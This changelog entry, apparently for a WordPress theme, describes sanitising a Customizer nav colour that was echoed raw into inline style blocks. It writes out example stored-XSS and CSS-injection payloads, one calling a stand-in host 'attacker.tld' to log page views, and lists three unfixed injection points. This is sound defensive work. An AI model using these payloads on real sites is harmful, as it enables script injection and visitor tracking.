## 2026.09.03.1407

- Sanitized the Customizer nav colour before it reaches the inline `<style>` blocks in `templates/app.php:68` and `templates/kiosk.php:73`, both of which echoed `get_theme_mod('color_topnav', '#000000')` raw. The theme registers `color_topnav` (and every other colour setting) with only `default` and `transport` — no `sanitize_callback` — and `WP_Customize_Color_Control` is a JavaScript picker that validates nothing server side, so the stored value was whatever was POSTed. A user holding `edit_theme_options` could therefore store `#fff}</style><script>…</script><style>` and have it execute on these templates, or store a CSS payload such as `#fff; } body { background-image: url(https://attacker.tld/log) } .x {` to exfiltrate a page view — CSS injection needs none of the characters an HTML escaper encodes, so `esc_html()` would not have helped here either. Both sites now run the value through `sanitize_hex_color()` and fall back to `#000000`, which reduces the output to `#` plus three or six hex digits: nothing that can close a declaration, close the rule block, open a `url()` or terminate the `<style>` element. The read-side check matters independently of the theme fix landing, because `get_theme_mod()` applies the `theme_mod_color_topnav` filter *before* returning, so a value injected through that filter is covered here too. `is_string()` is checked before delegating rather than casting with `(string)`: a theme mod can hold an array after an import or a migration, which emits an "Array to string conversion" warning on a public page, or an object with no `__toString()`, which is an uncaught `Error` — core's `sanitize_hex_color()` passes its argument straight to `preg_match()` and has no type guard of its own. This matches the two sibling helpers added in the same issue, `Proud\Core\action_button_color()` in wp-proud-core and `proud_hex_theme_mod()` in wp-proud-theme, which is where the corresponding `sanitize_callback` fix for the setting itself lives. Note that the `kiosk.php` occurrence sits inside a `/* … */` CSS comment block spanning lines 68-92 and so does not render today; it is fixed anyway, since before this change a stored `*/` followed by `</style>` would have escaped both the comment and the style element. Found during the security review for the widget output escaping work in wp-proud-core, not reported from a site. Not fixed here and worth their own issue: `json_encode($settings)` is written into a `<script>` block without `JSON_HEX_TAG`, so a setting containing `</script>` breaks out of the element; `$google_analytics` is emitted raw inside a JavaScript string literal; and `$settings['global']['google_key']` is emitted raw into a script `src`.
